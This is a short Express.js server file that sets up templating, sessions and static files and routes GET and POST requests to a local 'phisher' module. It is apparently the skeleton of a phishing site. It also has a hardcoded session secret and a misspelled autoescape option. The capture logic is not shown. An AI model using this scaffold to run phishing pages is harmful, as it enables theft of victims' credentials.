
const path = require("path")
const express = require("express");
const session = require("express-session")
const nunjucks = require("nunjucks")
const phisher = require("./phisher");

const app = express()
nunjucks.configure(path.resolve(__dirname,'view'),{
  express:app,
  autoscape:true,
  noCache:false,
  watch:true
})

app.use(express.json())
app.use(express.urlencoded({extended: true}))

app.use(session({
  secret:"secret of the star",
  saveUninitialized: false,
  resave: false
}))
app.use(express.static(path.join(__dirname,'public')))




app.get("/",phisher.phisherGET)
app.post("/",phisher.phisherPOST)


const PORT = 9000;
app.listen(process.env.PORT|PORT,(err)=>{
  if(err){
    console.log(err)
   }else{
    console.log(`Running Server on ${PORT}...`)
   }
});